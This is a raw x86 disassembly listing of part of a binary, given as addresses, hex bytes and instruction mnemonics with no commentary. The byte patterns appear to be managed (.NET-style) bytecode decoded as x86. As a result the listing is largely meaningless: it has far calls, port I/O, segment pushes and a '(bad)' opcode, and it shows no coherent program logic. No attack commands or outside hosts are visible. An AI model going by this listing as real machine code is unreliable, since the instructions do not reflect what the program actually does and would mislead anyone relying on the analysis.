100030da:	04 2b                	add    $0x2b,%al
100030dc:	4a                   	dec    %edx
100030dd:	02 7b 36             	add    0x36(%ebx),%bh
100030e0:	00 00                	add    %al,(%eax)
100030e2:	04 19                	add    $0x19,%al
100030e4:	16                   	push   %ss
100030e5:	9e                   	sahf
100030e6:	02 7b 2f             	add    0x2f(%ebx),%bh
100030e9:	00 00                	add    %al,(%eax)
100030eb:	04 19                	add    $0x19,%al
100030ed:	9a 02 7b 2a 00 00 04 	lcall  $0x400,$0x2a7b02
100030f4:	6f                   	outsl  %ds:(%esi),(%dx)
100030f5:	3a 00                	cmp    (%eax),%al
100030f7:	00 0a                	add    %cl,(%edx)
100030f9:	02 7b 30             	add    0x30(%ebx),%bh
100030fc:	00 00                	add    %al,(%eax)
100030fe:	04 19                	add    $0x19,%al
10003100:	9a 17 6f 3b 00 00 0a 	lcall  $0xa00,$0x3b6f17
10003107:	02 7b 2d             	add    0x2d(%ebx),%bh
1000310a:	00 00                	add    %al,(%eax)
1000310c:	04 19                	add    $0x19,%al
1000310e:	9a 16 6f 3b 00 00 0a 	lcall  $0xa00,$0x3b6f16
10003115:	02 7b 2c             	add    0x2c(%ebx),%bh
10003118:	00 00                	add    %al,(%eax)
1000311a:	04 19                	add    $0x19,%al
1000311c:	9a 28 3d 00 00 0a 6f 	lcall  $0x6f0a,$0x3d28
10003123:	3c 00                	cmp    $0x0,%al
10003125:	00 0a                	add    %cl,(%edx)
10003127:	02 7b 36             	add    0x36(%ebx),%bh
1000312a:	00 00                	add    %al,(%eax)
1000312c:	04 16                	add    $0x16,%al
1000312e:	94                   	xchg   %eax,%esp
1000312f:	02 7b 36             	add    0x36(%ebx),%bh
10003132:	00 00                	add    %al,(%eax)
10003134:	04 17                	add    $0x17,%al
10003136:	94                   	xchg   %eax,%esp
10003137:	58                   	pop    %eax
10003138:	02 7b 36             	add    0x36(%ebx),%bh
1000313b:	00 00                	add    %al,(%eax)
1000313d:	04 18                	add    $0x18,%al
1000313f:	94                   	xchg   %eax,%esp
10003140:	58                   	pop    %eax
10003141:	02 7b 36             	add    0x36(%ebx),%bh
10003144:	00 00                	add    %al,(%eax)
10003146:	04 19                	add    $0x19,%al
10003148:	94                   	xchg   %eax,%esp
10003149:	58                   	pop    %eax
1000314a:	1a 5b 0d             	sbb    0xd(%ebx),%bl
1000314d:	02 7b 33             	add    0x33(%ebx),%bh
10003150:	00 00                	add    %al,(%eax)
10003152:	04 02                	add    $0x2,%al
10003154:	7b 32                	jnp    0x10003188
10003156:	00 00                	add    %al,(%eax)
10003158:	04 6f                	add    $0x6f,%al
1000315a:	24 00                	and    $0x0,%al
1000315c:	00 0a                	add    %cl,(%edx)
1000315e:	09 5a 6c             	or     %ebx,0x6c(%edx)
10003161:	23 00                	and    (%eax),%eax
10003163:	00 00                	add    %al,(%eax)
10003165:	00 00                	add    %al,(%eax)
10003167:	00 59 40             	add    %bl,0x40(%ecx)
1000316a:	5b                   	pop    %ebx
1000316b:	69 6f 33 00 00 0a 02 	imul   $0x20a0000,0x33(%edi),%ebp
10003172:	7b 34                	jnp    0x100031a8
10003174:	00 00                	add    %al,(%eax)
10003176:	04 09                	add    $0x9,%al
10003178:	8c 15 00 00 01 72    	mov    %ss,0x72010000
1000317e:	27                   	daa
1000317f:	01 00                	add    %eax,(%eax)
10003181:	70 28                	jo     0x100031ab
10003183:	34 00                	xor    $0x0,%al
10003185:	00 0a                	add    %cl,(%edx)
10003187:	6f                   	outsl  %ds:(%esi),(%dx)
10003188:	35 00 00 0a 02       	xor    $0x20a0000,%eax
1000318d:	7b 38                	jnp    0x100031c7
1000318f:	00 00                	add    %al,(%eax)
10003191:	04 1f                	add    $0x1f,%al
10003193:	3c 5d                	cmp    $0x5d,%al
10003195:	3a cc                	cmp    %ah,%cl
10003197:	00 00                	add    %al,(%eax)
10003199:	00 72 89             	add    %dh,-0x77(%edx)
1000319c:	00 00                	add    %al,(%eax)
1000319e:	70 28                	jo     0x100031c8
100031a0:	3e 00 00             	add    %al,%ds:(%eax)
100031a3:	0a 13                	or     (%ebx),%dl
100031a5:	06                   	push   %es
100031a6:	12 06                	adc    (%esi),%al
100031a8:	72 79                	jb     0x10003223
100031aa:	01 00                	add    %eax,(%eax)
100031ac:	70 28                	jo     0x100031d6
100031ae:	3f                   	aas
100031af:	00 00                	add    %al,(%eax)
100031b1:	0a 72 8b             	or     -0x75(%edx),%dh
100031b4:	01 00                	add    %eax,(%eax)
100031b6:	70 02                	jo     0x100031ba
100031b8:	7b 39                	jnp    0x100031f3
100031ba:	00 00                	add    %al,(%eax)
100031bc:	04 02                	add    $0x2,%al
100031be:	7b 38                	jnp    0x100031f8
100031c0:	00 00                	add    %al,(%eax)
100031c2:	04 1f                	add    $0x1f,%al
100031c4:	3c 5b                	cmp    $0x5b,%al
100031c6:	02 7b 39             	add    0x39(%ebx),%bh
100031c9:	00 00                	add    %al,(%eax)
100031cb:	04 8e                	add    $0x8e,%al
100031cd:	69 5d 9a 28 40 00 00 	imul   $0x4028,-0x66(%ebp),%ebx
100031d4:	0a 13                	or     (%ebx),%dl
100031d6:	04 02                	add    $0x2,%al
100031d8:	7b 35                	jnp    0x1000320f
100031da:	00 00                	add    %al,(%eax)
100031dc:	04 6f                	add    $0x6f,%al
100031de:	41                   	inc    %ecx
100031df:	00 00                	add    %al,(%eax)
100031e1:	0a 17                	or     (%edi),%dl
100031e3:	8d 13                	lea    (%ebx),%edx
100031e5:	00 00                	add    %al,(%eax)
100031e7:	01 13                	add    %edx,(%ebx)
100031e9:	07                   	pop    %es
100031ea:	11 07                	adc    %eax,(%edi)
100031ec:	16                   	push   %ss
100031ed:	1f                   	pop    %ds
100031ee:	0a 9d 11 07 6f 42    	or     0x426f0711(%ebp),%bl
100031f4:	00 00                	add    %al,(%eax)
100031f6:	0a 13                	or     (%ebx),%dl
100031f8:	05 11 05 8e 69       	add    $0x698e0511,%eax
100031fd:	18 31                	sbb    %dh,(%ecx)
100031ff:	44                   	inc    %esp
10003200:	02 7b 35             	add    0x35(%ebx),%bh
10003203:	00 00                	add    %al,(%eax)
10003205:	04 1b                	add    $0x1b,%al
10003207:	8d 11                	lea    (%ecx),%edx
10003209:	00 00                	add    %al,(%eax)
1000320b:	01 13                	add    %edx,(%ebx)
1000320d:	08 11                	or     %dl,(%ecx)
1000320f:	08 16                	or     %dl,(%esi)
10003211:	11 05 17 9a a2 11    	adc    %eax,0x11a29a17
10003217:	08 17                	or     %dl,(%edi)
10003219:	72 19                	jb     0x10003234
1000321b:	00 00                	add    %al,(%eax)
1000321d:	70 a2                	jo     0x100031c1
1000321f:	11 08                	adc    %ecx,(%eax)
10003221:	18 11                	sbb    %dl,(%ecx)
10003223:	05 18 9a a2 11       	add    $0x11a29a18,%eax
10003228:	08 19                	or     %bl,(%ecx)
1000322a:	72 19                	jb     0x10003245
1000322c:	00 00                	add    %al,(%eax)
1000322e:	70 a2                	jo     0x100031d2
10003230:	11 08                	adc    %ecx,(%eax)
10003232:	1a 11                	sbb    (%ecx),%dl
10003234:	04 a2                	add    $0xa2,%al
10003236:	11 08                	adc    %ecx,(%eax)
10003238:	28 43 00             	sub    %al,0x0(%ebx)
1000323b:	00 0a                	add    %cl,(%edx)
1000323d:	6f                   	outsl  %ds:(%esi),(%dx)
1000323e:	35 00 00 0a 2b       	xor    $0x2b0a0000,%eax
10003243:	22 02                	and    (%edx),%al
10003245:	7b 35                	jnp    0x1000327c
10003247:	00 00                	add    %al,(%eax)
10003249:	04 02                	add    $0x2,%al
1000324b:	7b 35                	jnp    0x10003282
1000324d:	00 00                	add    %al,(%eax)
1000324f:	04 6f                	add    $0x6f,%al
10003251:	41                   	inc    %ecx
10003252:	00 00                	add    %al,(%eax)
10003254:	0a 72 19             	or     0x19(%edx),%dh
10003257:	00 00                	add    %al,(%eax)
10003259:	70 11                	jo     0x1000326c
1000325b:	04 28                	add    $0x28,%al
1000325d:	44                   	inc    %esp
1000325e:	00 00                	add    %al,(%eax)
10003260:	0a 6f 35             	or     0x35(%edi),%ch
10003263:	00 00                	add    %al,(%eax)
10003265:	0a 7e 0e             	or     0xe(%esi),%bh
10003268:	00 00                	add    %al,(%eax)
1000326a:	04 17                	add    $0x17,%al
1000326c:	6f                   	outsl  %ds:(%esi),(%dx)
1000326d:	36 00 00             	add    %al,%ss:(%eax)
10003270:	0a 7e 0e             	or     0xe(%esi),%bh
10003273:	00 00                	add    %al,(%eax)
10003275:	04 6f                	add    $0x6f,%al
10003277:	37                   	aaa
10003278:	00 00                	add    %al,(%eax)
1000327a:	0a 7e 0d             	or     0xd(%esi),%bh
1000327d:	00 00                	add    %al,(%eax)
1000327f:	04 16                	add    $0x16,%al
10003281:	16                   	push   %ss
10003282:	16                   	push   %ss
10003283:	16                   	push   %ss
10003284:	1f                   	pop    %ds
10003285:	43                   	inc    %ebx
10003286:	28 2e                	sub    %ch,(%esi)
10003288:	00 00                	add    %al,(%eax)
1000328a:	06                   	push   %es
1000328b:	26 de 03             	fiadds %es:(%ebx)
1000328e:	26 de 00             	fiadds %es:(%eax)
10003291:	2a 00                	sub    (%eax),%al
10003293:	00 41 1c             	add    %al,0x1c(%ecx)
	...
1000329e:	00 00                	add    %al,(%eax)
100032a0:	be 03 00 00 be       	mov    $0xbe000003,%esi
100032a5:	03 00                	add    (%eax),%eax
100032a7:	00 03                	add    %al,(%ebx)
100032a9:	00 00                	add    %al,(%eax)
100032ab:	00 01                	add    %al,(%ecx)
100032ad:	00 00                	add    %al,(%eax)
100032af:	01 1b                	add    %ebx,(%ebx)
100032b1:	30 07                	xor    %al,(%edi)
100032b3:	00 e8                	add    %ch,%al
100032b5:	02 00                	add    (%eax),%al
100032b7:	00 0d 00 00 11 28    	add    %cl,0x28110000
100032bd:	45                   	inc    %ebp
100032be:	00 00                	add    %al,(%eax)
100032c0:	0a 6f 46             	or     0x46(%edi),%ch
100032c3:	00 00                	add    %al,(%eax)
100032c5:	0a 0a                	or     (%edx),%cl
100032c7:	28 47 00             	sub    %al,0x0(%edi)
100032ca:	00 0a                	add    %cl,(%edx)
100032cc:	0b 12                	or     (%edx),%edx
100032ce:	00 28                	add    %ch,(%eax)
100032d0:	48                   	dec    %eax
100032d1:	00 00                	add    %al,(%eax)
100032d3:	0a 12                	or     (%edx),%dl
100032d5:	01 28                	add    %ebp,(%eax)
100032d7:	48                   	dec    %eax
100032d8:	00 00                	add    %al,(%eax)
100032da:	0a 59 0c             	or     0xc(%ecx),%bl
100032dd:	12 00                	adc    (%eax),%al
100032df:	28 49 00             	sub    %cl,0x0(%ecx)
100032e2:	00 0a                	add    %cl,(%edx)
100032e4:	12 01                	adc    (%ecx),%al
100032e6:	28 49 00             	sub    %cl,0x0(%ecx)
100032e9:	00 0a                	add    %cl,(%edx)
100032eb:	59                   	pop    %ecx
100032ec:	0d 08 12 00 28       	or     $0x28001208,%eax
100032f1:	4a                   	dec    %edx
100032f2:	00 00                	add    %al,(%eax)
100032f4:	0a 18                	or     (%eax),%bl
100032f6:	5b                   	pop    %ebx
100032f7:	58                   	pop    %eax
100032f8:	13 04 09             	adc    (%ecx,%ecx,1),%eax
100032fb:	12 00                	adc    (%eax),%al
100032fd:	28 4b 00             	sub    %cl,0x0(%ebx)
10003300:	00 0a                	add    %cl,(%edx)
10003302:	18 5b 58             	sbb    %bl,0x58(%ebx)
10003305:	13 05 7e 12 00 00    	adc    0x127e,%eax
1000330b:	04 17                	add    $0x17,%al
1000330d:	40                   	inc    %eax
1000330e:	b4 00                	mov    $0x0,%ah
10003310:	00 00                	add    %al,(%eax)
10003312:	02 7b 18             	add    0x18(%ebx),%bh
10003315:	00 00                	add    %al,(%eax)
10003317:	04 11                	add    $0x11,%al
10003319:	04 02                	add    $0x2,%al
1000331b:	7b 18                	jnp    0x10003335
1000331d:	00 00                	add    %al,(%eax)
1000331f:	04 6f                	add    $0x6f,%al
10003321:	24 00                	and    $0x0,%al
10003323:	00 0a                	add    %cl,(%edx)
10003325:	18 5b 59             	sbb    %bl,0x59(%ebx)
10003328:	6f                   	outsl  %ds:(%esi),(%dx)
10003329:	4c                   	dec    %esp
1000332a:	00 00                	add    %al,(%eax)
1000332c:	0a 02                	or     (%edx),%al
1000332e:	7b 18                	jnp    0x10003348
10003330:	00 00                	add    %al,(%eax)
10003332:	04 11                	add    $0x11,%al
10003334:	05 20 96 00 00       	add    $0x9620,%eax
10003339:	00 59 6f             	add    %bl,0x6f(%ecx)
1000333c:	4d                   	dec    %ebp
1000333d:	00 00                	add    %al,(%eax)
1000333f:	0a 02                	or     (%edx),%al
10003341:	7b 19                	jnp    0x1000335c
10003343:	00 00                	add    %al,(%eax)
10003345:	04 11                	add    $0x11,%al
10003347:	04 02                	add    $0x2,%al
10003349:	7b 19                	jnp    0x10003364
1000334b:	00 00                	add    %al,(%eax)
1000334d:	04 6f                	add    $0x6f,%al
1000334f:	24 00                	and    $0x0,%al
10003351:	00 0a                	add    %cl,(%edx)
10003353:	18 5b 59             	sbb    %bl,0x59(%ebx)
10003356:	6f                   	outsl  %ds:(%esi),(%dx)
10003357:	4c                   	dec    %esp
10003358:	00 00                	add    %al,(%eax)
1000335a:	0a 02                	or     (%edx),%al
1000335c:	7b 19                	jnp    0x10003377
1000335e:	00 00                	add    %al,(%eax)
10003360:	04 11                	add    $0x11,%al
10003362:	05 1f 1e 59 6f       	add    $0x6f591e1f,%eax
10003367:	4d                   	dec    %ebp
10003368:	00 00                	add    %al,(%eax)
1000336a:	0a 02                	or     (%edx),%al
1000336c:	7b 1a                	jnp    0x10003388
1000336e:	00 00                	add    %al,(%eax)
10003370:	04 11                	add    $0x11,%al
10003372:	04 02                	add    $0x2,%al
10003374:	7b 1a                	jnp    0x10003390
10003376:	00 00                	add    %al,(%eax)
10003378:	04 6f                	add    $0x6f,%al
1000337a:	24 00                	and    $0x0,%al
1000337c:	00 0a                	add    %cl,(%edx)
1000337e:	18 5b 59             	sbb    %bl,0x59(%ebx)
10003381:	6f                   	outsl  %ds:(%esi),(%dx)
10003382:	4c                   	dec    %esp
10003383:	00 00                	add    %al,(%eax)
10003385:	0a 02                	or     (%edx),%al
10003387:	7b 1a                	jnp    0x100033a3
10003389:	00 00                	add    %al,(%eax)
1000338b:	04 11                	add    $0x11,%al
1000338d:	05 1f 3c 58 6f       	add    $0x6f583c1f,%eax
10003392:	4d                   	dec    %ebp
10003393:	00 00                	add    %al,(%eax)
10003395:	0a 02                	or     (%edx),%al
10003397:	7b 1b                	jnp    0x100033b4
10003399:	00 00                	add    %al,(%eax)
1000339b:	04 11                	add    $0x11,%al
1000339d:	04 02                	add    $0x2,%al
1000339f:	7b 1b                	jnp    0x100033bc
100033a1:	00 00                	add    %al,(%eax)
100033a3:	04 6f                	add    $0x6f,%al
100033a5:	24 00                	and    $0x0,%al
100033a7:	00 0a                	add    %cl,(%edx)
100033a9:	18 5b 59             	sbb    %bl,0x59(%ebx)
100033ac:	6f                   	outsl  %ds:(%esi),(%dx)
100033ad:	4c                   	dec    %esp
100033ae:	00 00                	add    %al,(%eax)
100033b0:	0a 02                	or     (%edx),%al
100033b2:	7b 1b                	jnp    0x100033cf
100033b4:	00 00                	add    %al,(%eax)
100033b6:	04 11                	add    $0x11,%al
100033b8:	05 1f 78 58 6f       	add    $0x6f58781f,%eax
100033bd:	4d                   	dec    %ebp
100033be:	00 00                	add    %al,(%eax)
100033c0:	0a 38                	or     (%eax),%bh
100033c2:	6f                   	outsl  %ds:(%esi),(%dx)
100033c3:	01 00                	add    %eax,(%eax)
100033c5:	00 7e 12             	add    %bh,0x12(%esi)
100033c8:	00 00                	add    %al,(%eax)
100033ca:	04 18                	add    $0x18,%al
100033cc:	40                   	inc    %eax
100033cd:	83 00 00             	addl   $0x0,(%eax)
100033d0:	00 02                	add    %al,(%edx)
100033d2:	7b 18                	jnp    0x100033ec
100033d4:	00 00                	add    %al,(%eax)
100033d6:	04 11                	add    $0x11,%al
100033d8:	04 02                	add    $0x2,%al
100033da:	7b 18                	jnp    0x100033f4
100033dc:	00 00                	add    %al,(%eax)
100033de:	04 6f                	add    $0x6f,%al
100033e0:	24 00                	and    $0x0,%al
100033e2:	00 0a                	add    %cl,(%edx)
100033e4:	18 5b 59             	sbb    %bl,0x59(%ebx)
100033e7:	6f                   	outsl  %ds:(%esi),(%dx)
100033e8:	4c                   	dec    %esp
100033e9:	00 00                	add    %al,(%eax)
100033eb:	0a 02                	or     (%edx),%al
100033ed:	7b 18                	jnp    0x10003407
100033ef:	00 00                	add    %al,(%eax)
100033f1:	04 11                	add    $0x11,%al
100033f3:	05 1f 78 59 6f       	add    $0x6f59781f,%eax
100033f8:	4d                   	dec    %ebp
100033f9:	00 00                	add    %al,(%eax)
100033fb:	0a 02                	or     (%edx),%al
100033fd:	7b 19                	jnp    0x10003418
100033ff:	00 00                	add    %al,(%eax)
10003401:	04 11                	add    $0x11,%al
10003403:	04 02                	add    $0x2,%al
10003405:	7b 19                	jnp    0x10003420
10003407:	00 00                	add    %al,(%eax)
10003409:	04 6f                	add    $0x6f,%al
1000340b:	24 00                	and    $0x0,%al
1000340d:	00 0a                	add    %cl,(%edx)
1000340f:	18 5b 59             	sbb    %bl,0x59(%ebx)
10003412:	6f                   	outsl  %ds:(%esi),(%dx)
10003413:	4c                   	dec    %esp
10003414:	00 00                	add    %al,(%eax)
10003416:	0a 02                	or     (%edx),%al
10003418:	7b 19                	jnp    0x10003433
1000341a:	00 00                	add    %al,(%eax)
1000341c:	04 11                	add    $0x11,%al
1000341e:	05 6f 4d 00 00       	add    $0x4d6f,%eax
10003423:	0a 02                	or     (%edx),%al
10003425:	7b 1b                	jnp    0x10003442
10003427:	00 00                	add    %al,(%eax)
10003429:	04 11                	add    $0x11,%al
1000342b:	04 02                	add    $0x2,%al
1000342d:	7b 1b                	jnp    0x1000344a
1000342f:	00 00                	add    %al,(%eax)
10003431:	04 6f                	add    $0x6f,%al
10003433:	24 00                	and    $0x0,%al
10003435:	00 0a                	add    %cl,(%edx)
10003437:	18 5b 59             	sbb    %bl,0x59(%ebx)
1000343a:	6f                   	outsl  %ds:(%esi),(%dx)
1000343b:	4c                   	dec    %esp
1000343c:	00 00                	add    %al,(%eax)
1000343e:	0a 02                	or     (%edx),%al
10003440:	7b 1b                	jnp    0x1000345d
10003442:	00 00                	add    %al,(%eax)
10003444:	04 11                	add    $0x11,%al
10003446:	05 1f 50 58 6f       	add    $0x6f58501f,%eax
1000344b:	4d                   	dec    %ebp
1000344c:	00 00                	add    %al,(%eax)
1000344e:	0a 38                	or     (%eax),%bh
10003450:	e1 00                	loope  0x10003452
10003452:	00 00                	add    %al,(%eax)
10003454:	7e 12                	jle    0x10003468
10003456:	00 00                	add    %al,(%eax)
10003458:	04 19                	add    $0x19,%al
1000345a:	33 77 02             	xor    0x2(%edi),%esi
1000345d:	7b 19                	jnp    0x10003478
1000345f:	00 00                	add    %al,(%eax)
10003461:	04 08                	add    $0x8,%al
10003463:	12 00                	adc    (%eax),%al
10003465:	28 4a 00             	sub    %cl,0x0(%edx)
10003468:	00 0a                	add    %cl,(%edx)
1000346a:	1c 5b                	sbb    $0x5b,%al
1000346c:	58                   	pop    %eax
1000346d:	6f                   	outsl  %ds:(%esi),(%dx)
1000346e:	4c                   	dec    %esp
1000346f:	00 00                	add    %al,(%eax)
10003471:	0a 02                	or     (%edx),%al
10003473:	7b 19                	jnp    0x1000348e
10003475:	00 00                	add    %al,(%eax)
10003477:	04 11                	add    $0x11,%al
10003479:	05 20 c8 00 00       	add    $0xc820,%eax
1000347e:	00 59 6f             	add    %bl,0x6f(%ecx)
10003481:	4d                   	dec    %ebp
10003482:	00 00                	add    %al,(%eax)
10003484:	0a 02                	or     (%edx),%al
10003486:	7b 1a                	jnp    0x100034a2
10003488:	00 00                	add    %al,(%eax)
1000348a:	04 08                	add    $0x8,%al
1000348c:	12 00                	adc    (%eax),%al
1000348e:	28 4a 00             	sub    %cl,0x0(%edx)
10003491:	00 0a                	add    %cl,(%edx)
10003493:	1c 5b                	sbb    $0x5b,%al
10003495:	58                   	pop    %eax
10003496:	6f                   	outsl  %ds:(%esi),(%dx)
10003497:	4c                   	dec    %esp
10003498:	00 00                	add    %al,(%eax)
1000349a:	0a 02                	or     (%edx),%al
1000349c:	7b 1a                	jnp    0x100034b8
1000349e:	00 00                	add    %al,(%eax)
100034a0:	04 11                	add    $0x11,%al
100034a2:	05 1f 14 59 6f       	add    $0x6f59141f,%eax
100034a7:	4d                   	dec    %ebp
100034a8:	00 00                	add    %al,(%eax)
100034aa:	0a 02                	or     (%edx),%al
100034ac:	7b 1b                	jnp    0x100034c9
100034ae:	00 00                	add    %al,(%eax)
100034b0:	04 08                	add    $0x8,%al
100034b2:	12 00                	adc    (%eax),%al
100034b4:	28 4a 00             	sub    %cl,0x0(%edx)
100034b7:	00 0a                	add    %cl,(%edx)
100034b9:	1c 5b                	sbb    $0x5b,%al
100034bb:	58                   	pop    %eax
100034bc:	6f                   	outsl  %ds:(%esi),(%dx)
100034bd:	4c                   	dec    %esp
100034be:	00 00                	add    %al,(%eax)
100034c0:	0a 02                	or     (%edx),%al
100034c2:	7b 1b                	jnp    0x100034df
100034c4:	00 00                	add    %al,(%eax)
100034c6:	04 11                	add    $0x11,%al
100034c8:	05 1f 78 58 6f       	add    $0x6f58781f,%eax
100034cd:	4d                   	dec    %ebp
100034ce:	00 00                	add    %al,(%eax)
100034d0:	0a 2b                	or     (%ebx),%ch
100034d2:	62 7e 12             	bound  %edi,0x12(%esi)
100034d5:	00 00                	add    %al,(%eax)
100034d7:	04 1a                	add    $0x1a,%al
100034d9:	33 5a 02             	xor    0x2(%edx),%ebx
100034dc:	7b 19                	jnp    0x100034f7
100034de:	00 00                	add    %al,(%eax)
100034e0:	04 08                	add    $0x8,%al
100034e2:	1f                   	pop    %ds
100034e3:	32 58 6f             	xor    0x6f(%eax),%bl
100034e6:	4c                   	dec    %esp
100034e7:	00 00                	add    %al,(%eax)
100034e9:	0a 02                	or     (%edx),%al
100034eb:	7b 19                	jnp    0x10003506
100034ed:	00 00                	add    %al,(%eax)
100034ef:	04 11                	add    $0x11,%al
100034f1:	05 1f 32 59 6f       	add    $0x6f59321f,%eax
100034f6:	4d                   	dec    %ebp
100034f7:	00 00                	add    %al,(%eax)
100034f9:	0a 02                	or     (%edx),%al
100034fb:	7b 1a                	jnp    0x10003517
100034fd:	00 00                	add    %al,(%eax)
100034ff:	04 08                	add    $0x8,%al
10003501:	1f                   	pop    %ds
10003502:	32 58 6f             	xor    0x6f(%eax),%bl
10003505:	4c                   	dec    %esp
10003506:	00 00                	add    %al,(%eax)
10003508:	0a 02                	or     (%edx),%al
1000350a:	7b 1a                	jnp    0x10003526
1000350c:	00 00                	add    %al,(%eax)
1000350e:	04 11                	add    $0x11,%al
10003510:	05 6f 4d 00 00       	add    $0x4d6f,%eax
10003515:	0a 02                	or     (%edx),%al
10003517:	7b 1b                	jnp    0x10003534
10003519:	00 00                	add    %al,(%eax)
1000351b:	04 08                	add    $0x8,%al
1000351d:	1f                   	pop    %ds
1000351e:	32 58 6f             	xor    0x6f(%eax),%bl
10003521:	4c                   	dec    %esp
10003522:	00 00                	add    %al,(%eax)
10003524:	0a 02                	or     (%edx),%al
10003526:	7b 1b                	jnp    0x10003543
10003528:	00 00                	add    %al,(%eax)
1000352a:	04 11                	add    $0x11,%al
1000352c:	05 1f 50 58 6f       	add    $0x6f58501f,%eax
10003531:	4d                   	dec    %ebp
10003532:	00 00                	add    %al,(%eax)
10003534:	0a 7e 0e             	or     0xe(%esi),%bh
10003537:	00 00                	add    %al,(%eax)
10003539:	04 6f                	add    $0x6f,%al
1000353b:	37                   	aaa
1000353c:	00 00                	add    %al,(%eax)
1000353e:	0a 1f                	or     (%edi),%bl
10003540:	11 28                	adc    %ebp,(%eax)
10003542:	2b 00                	sub    (%eax),%eax
10003544:	00 06                	add    %al,(%esi)
10003546:	26 de 03             	fiadds %es:(%ebx)
10003549:	26 de 00             	fiadds %es:(%eax)
1000354c:	7e 0e                	jle    0x1000355c
1000354e:	00 00                	add    %al,(%eax)
10003550:	04 6f                	add    $0x6f,%al
10003552:	37                   	aaa
10003553:	00 00                	add    %al,(%eax)
10003555:	0a 1f                	or     (%edi),%bl
10003557:	ec                   	in     (%dx),%al
10003558:	7e 0e                	jle    0x10003568
1000355a:	00 00                	add    %al,(%eax)
1000355c:	04 6f                	add    $0x6f,%al
1000355e:	37                   	aaa
1000355f:	00 00                	add    %al,(%eax)
10003561:	0a 1f                	or     (%edi),%bl
10003563:	ec                   	in     (%dx),%al
10003564:	28 2d 00 00 06 20    	sub    %ch,0x20060000
1000356a:	00 00                	add    %al,(%eax)
1000356c:	08 00                	or     %al,(%eax)
1000356e:	60                   	pusha
1000356f:	1f                   	pop    %ds
10003570:	20 60 20             	and    %ah,0x20(%eax)
10003573:	80 00 00             	addb   $0x0,(%eax)
10003576:	00 60 28             	add    %ah,0x28(%eax)
10003579:	2c 00                	sub    $0x0,%al
1000357b:	00 06                	add    %al,(%esi)
1000357d:	26 de 03             	fiadds %es:(%ebx)
10003580:	26 de 00             	fiadds %es:(%eax)
10003583:	7e 0e                	jle    0x10003593
10003585:	00 00                	add    %al,(%eax)
10003587:	04 6f                	add    $0x6f,%al
10003589:	37                   	aaa
1000358a:	00 00                	add    %al,(%eax)
1000358c:	0a 7e 0d             	or     0xd(%esi),%bh
1000358f:	00 00                	add    %al,(%eax)
10003591:	04 16                	add    $0x16,%al
10003593:	16                   	push   %ss
10003594:	16                   	push   %ss
10003595:	16                   	push   %ss
10003596:	1f                   	pop    %ds
10003597:	43                   	inc    %ebx
10003598:	28 2e                	sub    %ch,(%esi)
1000359a:	00 00                	add    %al,(%eax)
1000359c:	06                   	push   %es
1000359d:	26 de 03             	fiadds %es:(%ebx)
100035a0:	26 de 00             	fiadds %es:(%eax)
100035a3:	2a 01                	sub    (%ecx),%al
100035a5:	28 00                	sub    %al,(%eax)
100035a7:	00 00                	add    %al,(%eax)
100035a9:	00 79 02             	add    %bh,0x2(%ecx)
100035ac:	14 8d                	adc    $0x8d,%al
100035ae:	02 03                	add    (%ebx),%al
100035b0:	01 00                	add    %eax,(%eax)
100035b2:	00 01                	add    %al,(%ecx)
100035b4:	00 00                	add    %al,(%eax)
100035b6:	90                   	nop
100035b7:	02 34 c4             	add    (%esp,%eax,8),%dh
100035ba:	02 03                	add    (%ebx),%al
100035bc:	01 00                	add    %eax,(%eax)
100035be:	00 01                	add    %al,(%ecx)
100035c0:	00 00                	add    %al,(%eax)
100035c2:	c7 02 1d e4 02 03    	movl   $0x302e41d,(%edx)
100035c8:	01 00                	add    %eax,(%eax)
100035ca:	00 01                	add    %al,(%ecx)
100035cc:	46                   	inc    %esi
100035cd:	fe                   	(bad)
100035ce:	13 7e 11             	adc    0x11(%esi),%edi
100035d1:	00 00                	add    %al,(%eax)
100035d3:	04 2d                	add    $0x2d,%al
100035d5:	07                   	pop    %es
100035d6:	03 17                	add    (%edi),%edx
100035d8:	6f                   	outsl  %ds:(%esi),(%dx)
100035d9:	4e                   	dec    %esi
100035da:	00 00                	add    %al,(%eax)
100035dc:	0a 2a                	or     (%edx),%ch
100035de:	00 00                	add    %al,(%eax)
100035e0:	1b 30                	sbb    (%eax),%esi
100035e2:	04 00                	add    $0x0,%al
100035e4:	ab                   	stos   %eax,%es:(%edi)
100035e5:	01 00                	add    %eax,(%eax)
100035e7:	00 0e                	add    %cl,(%esi)
100035e9:	00 00                	add    %al,(%eax)
100035eb:	11 02                	adc    %eax,(%edx)
100035ed:	25 7b 1e 00 00       	and    $0x1e7b,%eax
100035f2:	04 17                	add    $0x17,%al
100035f4:	58                   	pop    %eax
100035f5:	7d 1e                	jge    0x10003615
100035f7:	00 00                	add    %al,(%eax)
100035f9:	04 02                	add    $0x2,%al
100035fb:	25 7b 1d 00 00       	and    $0x1d7b,%eax
10003600:	04 23                	add    $0x23,%al
10003602:	9a 99 99 99 99 99 b9 	lcall  $0xb999,$0x99999999
10003609:	3f                   	aas
1000360a:	59                   	pop    %ecx
1000360b:	7d 1d                	jge    0x1000362a
1000360d:	00 00                	add    %al,(%eax)
1000360f:	04 7e                	add    $0x7e,%al
10003611:	12 00                	adc    (%eax),%al
10003613:	00 04 17             	add    %al,(%edi,%edx,1)
10003616:	2e 19 7e 12          	sbb    %edi,%cs:0x12(%esi)
1000361a:	00 00                	add    %al,(%eax)
1000361c:	04 18                	add    $0x18,%al
1000361e:	2e 11 7e 12          	adc    %edi,%cs:0x12(%esi)
10003622:	00 00                	add    %al,(%eax)
10003624:	04 1c                	add    $0x1c,%al
10003626:	32 14 7e             	xor    (%esi,%edi,2),%dl
10003629:	12 00                	adc    (%eax),%al
1000362b:	00 04 1f             	add    %al,(%edi,%ebx,1)
1000362e:	0a 30                	or     (%eax),%dh
10003630:	0b 02                	or     (%edx),%eax
10003632:	7b 18                	jnp    0x1000364c
10003634:	00 00                	add    %al,(%eax)
10003636:	04 6f                	add    $0x6f,%al
10003638:	32 00                	xor    (%eax),%al
1000363a:	00 0a                	add    %cl,(%edx)
1000363c:	28 45 00             	sub    %al,0x0(%ebp)
1000363f:	00 0a                	add    %cl,(%edx)
10003641:	6f                   	outsl  %ds:(%esi),(%dx)
10003642:	46                   	inc    %esi
10003643:	00 00                	add    %al,(%eax)
10003645:	0a 0a                	or     (%edx),%cl
10003647:	28 47 00             	sub    %al,0x0(%edi)
1000364a:	00 0a                	add    %cl,(%edx)
1000364c:	0b 12                	or     (%edx),%edx
1000364e:	00 28                	add    %ch,(%eax)
10003650:	48                   	dec    %eax
10003651:	00 00                	add    %al,(%eax)
10003653:	0a 12                	or     (%edx),%dl
